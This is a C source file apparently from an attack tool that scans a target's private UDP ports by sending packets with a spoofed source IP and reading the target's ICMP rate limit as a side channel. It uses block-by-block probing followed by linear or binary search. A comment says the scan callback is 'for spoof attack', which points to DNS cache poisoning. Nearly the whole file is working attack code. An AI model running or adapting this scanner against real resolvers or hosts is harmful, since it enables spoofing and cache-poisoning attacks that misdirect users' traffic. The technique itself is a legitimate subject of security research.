/*
    UDP private port scan implementation.
*/

#include "scanner.h"
#include "util.h"
#include "network.h"
#include "dns.h"
#include "common.h"

enum SCAN_MARK {
    M_CLOSED = 0,
    M_OPEN,
    M_SUSPICIOUS
};

/* Scan results. */
static struct scan_result* g_result_opened   = NULL;

/* Some scan options. */
static unsigned long       g_verify_gap       = 1000;     // Time gap (microseconds) to send verify.
static signed long long    g_verify_usec      = 75000;   // Time gap (microseconds) to recv ICMP port unreach.
static uint16_t            g_probe_src_port   = 9527;    // Source port used to send probe packet.
static uint16_t            g_verify_dst_port  = 1;       // Destination port to send verification packet.
static uint8_t             g_scan_payload[]   = {};      // UDP payload used by packet.

int                        g_scan_init       = FALSE;
int                        g_ignore_dns_port = FALSE;
scan_cb_t                  g_scan_callback   = NULL;

/* Create a new scan_result structure. */
static struct scan_result* new_scan_result() {
    return (struct scan_result*)alloc_memory(sizeof(struct scan_result));
}

/* Use free() to release scan_result structure. */
static void free_scan_result(struct scan_result* result) {
    link_free((struct link*)result);
}

/* Add a new port */
static void opened_port_got(uint16_t port) {
    // Call g_scan_callback.
    if (g_scan_callback != NULL)
        g_scan_callback(port);

    struct scan_result* tmp;

    tmp = new_scan_result();
    tmp->port = port;

    if (g_result_opened == NULL) {
        g_result_opened = tmp;
    } else
        link_append((struct link*)g_result_opened, (struct link*)tmp);
}

/* Send spoof UDP packet to probe the limit, parameter port_range should to be
   the ICMP limit of target OS. */
static void send_probe(int sockfd, uint8_t* packet, size_t packet_len, char* spoof_ip,
        char* target_ip, uint16_t port_start, unsigned int port_range) {
    uint16_t port, port_end;

    // Overflow check.
    if (port_start + port_range > UINT16_MAX)
        port_end = UINT16_MAX;
    else
        port_end = port_start + port_range;

    int sent;
    for (port = port_start; port != port_end; port++) {
        send_udp_packet(sockfd, packet, packet_len, inet_addr(spoof_ip), inet_addr(target_ip),
                        g_probe_src_port, port);
    }
}

/* Verify ICMP limit of target. */
static int verify_limit(int sockfd, uint8_t* packet, size_t packet_len, char* target_ip,
        uint16_t dst_port) {
    int verify_pass = FALSE;
    
    // Send.
    send_udp_packet(sockfd, packet, packet_len, local_addr(target_ip), inet_addr(target_ip),
                    g_probe_src_port, dst_port);

    // Buffer for recvfrom.
    uint8_t* buff = (uint8_t*)alloc_memory(512);
    struct iphdr* iph = (struct iphdr*)buff;

    // Try to recv ICMP.
    ssize_t len;
    while (TRUE) {
        len = recvfrom(sockfd, buff, 512, 0, NULL, NULL);
        if (len < 0)
            break;
        
        if (iph->protocol == IPPROTO_ICMP && iph->saddr == inet_addr(target_ip)) {	// !!! This may be too simple to check.
            // Got an ICMP packet.
            verify_pass = TRUE;
            break;
        }
    }

    free(buff);
    return verify_pass;
}

/* Assure if given port is opened. */
static int is_opened(int sockfd_probe, int sockfd_verify, uint8_t* packet, size_t packet_len,
        char* spoof_ip, char* target_ip, uint16_t port, uint16_t* partnet_ports,
        unsigned int partnet_ports_count) {
    int i, sent;

    // Send packet with partner ports.
    for (i = 0; i < partnet_ports_count; i++)
        send_udp_packet(sockfd_probe, packet, packet_len, inet_addr(spoof_ip),
                        inet_addr(target_ip), g_probe_src_port, partnet_ports[i]);

    // Send packet with given port.
    send_udp_packet(sockfd_probe, packet, packet_len, inet_addr(spoof_ip),
                    inet_addr(target_ip), g_probe_src_port, port);

    // Prevent packet disorder.
    usleep(g_verify_gap);

    // Verification.
    return verify_limit(sockfd_verify, packet, packet_len, target_ip, g_verify_dst_port);
}

/* Use liner search to scan. */
static void scan_liner_search(int sockfd_probe, int sockfd_verify, uint8_t* packet, size_t packet_len,
        char* spoof_ip, char* target_ip, uint16_t probe_port, unsigned int icmp_limit,
        uint16_t* partner_ports, unsigned int partner_ports_count, int verbos) {
    int i;
    for (i = probe_port; i < probe_port + icmp_limit; i++) {
        // !!! Liner search do not need gap.
        //sleep(0.1);

        if (is_opened(sockfd_probe, sockfd_verify, packet, packet_len, spoof_ip,
                      target_ip, i, partner_ports, partner_ports_count)) {
            // Got opened port.
            printf("[ * ] \t\033[32mOPENED: %d\033[0m\n", i);
            opened_port_got(i);
        } else {
            // Got closed port.
            if (verbos)
                printf("[ * ] \tCLOSED: %d\n", i);
        }
    }
}

/* For binary search. */
static int group_is_opened(int sockfd_probe, int sockfd_verify, uint8_t* packet, size_t packet_len,
        char* spoof_ip, char* target_ip, uint16_t* port_group, unsigned int port_group_count,
        uint16_t* partner_ports, unsigned int partner_ports_count, unsigned int icmp_limit) {
    int i, sent;

    // Send packet with partner ports.
    for (i = 0; i < icmp_limit - port_group_count; i++)
        send_udp_packet(sockfd_probe, packet, packet_len, inet_addr(spoof_ip), inet_addr(target_ip),
                        g_probe_src_port, partner_ports[i]);

    // Send packet with given port group.
    for (i = 0; i < port_group_count; i++)
        send_udp_packet(sockfd_probe, packet, packet_len, inet_addr(spoof_ip), inet_addr(target_ip),
                        g_probe_src_port, port_group[i]);

    // Verification.
    return verify_limit(sockfd_verify, packet, packet_len, target_ip, g_verify_dst_port);
}

/* Binary search function. */
static void binary_search(int sockfd_probe, int sockfd_verify, uint8_t* packet, size_t packet_len,
        char* spoof_ip, char* target_ip, uint16_t* port_group, unsigned int port_group_count,
        uint16_t* partner_ports, unsigned int partner_ports_count, unsigned int icmp_limit, int verbos) {
    // Gap.
    sleep(1);

    // Edge condition.
    if (port_group_count == 1) {
        if (is_opened(sockfd_probe, sockfd_verify, packet, packet_len, spoof_ip,
                      target_ip, port_group[0], partner_ports, partner_ports_count)) {
            // Got opened port.
            printf("[ * ] \t\033[32mOPENED: %d\033[0m\n", port_group[0]);
            opened_port_got(port_group[0]);
        } else {
            // Got closed port.
            if (verbos)
                printf("[ * ] \tCLOSED: %d\n", port_group[0]);
        }
        return;
    }

    uint16_t* sub_group_1;
    uint16_t* sub_group_2;
    unsigned int sub_group_1_count, sub_group_2_count;
    
    // Split group into two parts.
    if (port_group_count % 2 == 0) {
        sub_group_1 = port_group;
        sub_group_1_count = port_group_count / 2;
        sub_group_2 = port_group + port_group_count / 2;
        sub_group_2_count = port_group_count / 2;
    } else {
        sub_group_1 = port_group;
        sub_group_1_count = (port_group_count - 1) / 2;
        sub_group_2 = port_group + (port_group_count - 1) / 2;
        sub_group_2_count = (port_group_count + 1) / 2;
    }

    // Recursion.
    if (group_is_opened(sockfd_probe, sockfd_verify, packet, packet_len, spoof_ip, target_ip, sub_group_1,
                        sub_group_1_count, partner_ports, partner_ports_count, icmp_limit))
        binary_search(sockfd_probe, sockfd_verify, packet, packet_len, spoof_ip, target_ip, sub_group_1,
                      sub_group_1_count, partner_ports, partner_ports_count, icmp_limit, verbos);
    else if (group_is_opened(sockfd_probe, sockfd_verify, packet, packet_len, spoof_ip, target_ip, sub_group_2,
                               sub_group_2_count, partner_ports, partner_ports_count, icmp_limit))
        binary_search(sockfd_probe, sockfd_verify, packet, packet_len, spoof_ip, target_ip, sub_group_2,
                      sub_group_2_count, partner_ports, partner_ports_count, icmp_limit, verbos);
}

/* Use binary search to scan. */
static void scan_binary_search(int sockfd_probe, int sockfd_verify, uint8_t* packet, size_t packet_len,
        char* spoof_ip, char* target_ip, uint16_t probe_port, unsigned int icmp_limit,
        uint16_t* partner_ports, unsigned int partner_ports_count, int verbos) {
    uint16_t* port_group = (uint16_t*)alloc_memory(sizeof(uint16_t) * icmp_limit);

    // Set group.
    int i;
    for (i = 0; i < icmp_limit; i++)
        port_group[i] = probe_port + i;
    
    // Do binary search.
    binary_search(sockfd_probe, sockfd_verify, packet, packet_len, spoof_ip, target_ip,
                  port_group, icmp_limit, partner_ports, partner_ports_count, icmp_limit, verbos);

    free(port_group);
}

/* One round for scan. */
static void scan_block(int sockfd_probe, int sockfd_verify, uint8_t* packet, size_t packet_len,
        char* spoof_ip, char* target_ip, uint16_t probe_port, unsigned int icmp_limit,
        uint16_t* partner_ports, unsigned int partner_ports_count, int verbos) {
    if (g_ignore_dns_port) {
        // Filter 53 and 5353 out.
        if (probe_port < 53 && probe_port + 50 > 53)
            return;
        if (probe_port < 5353 && probe_port + 50 > 5353)
            return;
    }

    // Probe.
    send_probe(sockfd_probe, packet, packet_len, spoof_ip, target_ip, probe_port, icmp_limit);
    
    // Prevent packet disorder.
    usleep(g_verify_gap);

    // Verification.
    if (verify_limit(sockfd_verify, packet, packet_len, target_ip, g_verify_dst_port)) {
        // There is any port opened in current block.
        printf("[ * ] \033[32mHIT\033[0m: %d ~+ %d\n", probe_port, icmp_limit);
        
#ifdef _USE_BINARYSEARCH
        scan_binary_search(sockfd_probe, sockfd_verify, packet, packet_len, spoof_ip, target_ip,
                           probe_port, icmp_limit, partner_ports, partner_ports_count, verbos);
#else
        scan_liner_search(sockfd_probe, sockfd_verify, packet, packet_len, spoof_ip, target_ip,
                          probe_port, icmp_limit, partner_ports, partner_ports_count, verbos);
#endif // _USE_BINARYSEARCH

    } else {
        // No port opened in current block
        if (verbos)
            printf("[ * ] MISS: %d ~+ %d\n", probe_port, icmp_limit);
    }
}

/* Make UDP packet data. */
static size_t make_udp_packet_for_scan(uint8_t* out, size_t len, char* src_ip, char* dst_ip) {
    // Check buffer length.
    if (len < sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(g_scan_payload)) {
#ifdef _DEBUG
        printf("make_udp_packet_for_scan: length of buffer is too small.\n");
#endif
        abort();
    }

    return make_udp_packet(out, len, inet_addr(src_ip), inet_addr(dst_ip),
                           g_probe_src_port, 0, g_scan_payload, sizeof(g_scan_payload));
}

/* Scan block by block for the 1st phase. */
static void scan_block_by_block(int sockfd_probe, int sockfd_verify, uint8_t* packet, size_t packet_len,
        char* spoof_ip, char* target_ip, uint16_t port_start, uint16_t port_end,
        unsigned int icmp_limit, uint16_t* partner_ports, unsigned int partner_ports_count, int verbos,
        int* stop_flag) {
    uint16_t port;
    int i, res;

    for (port = port_start; port <= port_end - icmp_limit + 1; port += icmp_limit) {
        // !!! Block scan do not need gap.
        //sleep(0.1);

        // Check stop_flag
        if (*stop_flag)
            break;

        scan_block(sockfd_probe, sockfd_verify, packet, packet_len, spoof_ip, target_ip,
                   port, icmp_limit, partner_ports, partner_ports_count, verbos);
    }
}

/* Partner ports is the ports assure to be closed, which can be used for 2nd pahse scan.
   The return value is the length of partner_ports array. */
static unsigned int get_partner_ports(uint16_t** partner_ports, unsigned int icmp_limit) {
    *partner_ports = (uint16_t*)alloc_memory(sizeof(uint16_t) * (icmp_limit - 1));
    // Check.
    if (icmp_limit <= 1) {
#ifdef _DEBUG
        printf("get_partner_ports: icmp_limit is smaller than 1.\n");
#endif
        abort();
    }

    int i;

    // !!! Assume that port 1-49 is closed.
    for (i = 0; i < icmp_limit - 1; i++)
        (*partner_ports)[i] = i + 1;

    return icmp_limit - 1;
}

/* Run UDP scan aginst given target. */
void scan(char* spoof_ip, char* target_ip, uint16_t port_start, uint16_t port_end,
        unsigned int icmp_limit, int verbos, int* stop_flag) {
    // Check port_start and port_end.
    if (port_start > port_end || port_end - port_start + 1 < icmp_limit) {
#ifdef _DEBUG
        printf("scan: Port rangge error.\n");
#endif
        abort();
    }
    
    // Set socket FD.
    int sockfd_probe = make_sockfd_for_probe();
    int sockfd_verify = make_sockfd_for_verify(g_verify_usec);

    // Make packet.
    size_t len = sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(g_scan_payload);
    uint8_t* packet = (uint8_t*)alloc_memory(len);
    size_t packet_len = make_udp_packet_for_scan(packet, len, spoof_ip, target_ip);

    // Get partner ports.
    uint16_t* partner_ports = NULL;
    unsigned int partner_ports_count = get_partner_ports(&partner_ports, icmp_limit);

    // Start to scan.
    scan_block_by_block(sockfd_probe, sockfd_verify, packet, packet_len,
                        spoof_ip, target_ip, port_start, port_end, icmp_limit,
                        partner_ports, partner_ports_count, verbos, stop_flag);

    free(packet);
    close(sockfd_probe);
    close(sockfd_verify);
}

/* Init. */
void scan_init() {
    if (!g_scan_init) {
        g_scan_init = TRUE;
        dns_init();
    }
    if (g_result_opened != NULL) {
        free_scan_result(g_result_opened);
        g_result_opened = NULL;
    }
}

/* Get the results of OPENED. */
struct scan_result* scan_get_result_opened() {
    return g_result_opened;
}

/* Set the timer of verification. */
void scan_set_verify_usec(signed long long verify_usec) {
    g_verify_usec = verify_usec;
}

/* Set the src_port used to send probe. */
void scan_set_probe_src_port(uint16_t src_port) {
    g_probe_src_port = src_port;
}

/* Set the dst_port used to send verification. */
void scan_set_verify_dst_port(uint16_t dst_port) {
    g_verify_dst_port = dst_port;
}

/* Set if ignore DNS port. */
void scan_set_ignore_dns_port(int b) {
    g_ignore_dns_port = b;
}

/* Set scan_callback, which for spoof attack. */
void scan_set_scan_callback(scan_cb_t cb) {
    g_scan_callback = cb;
}
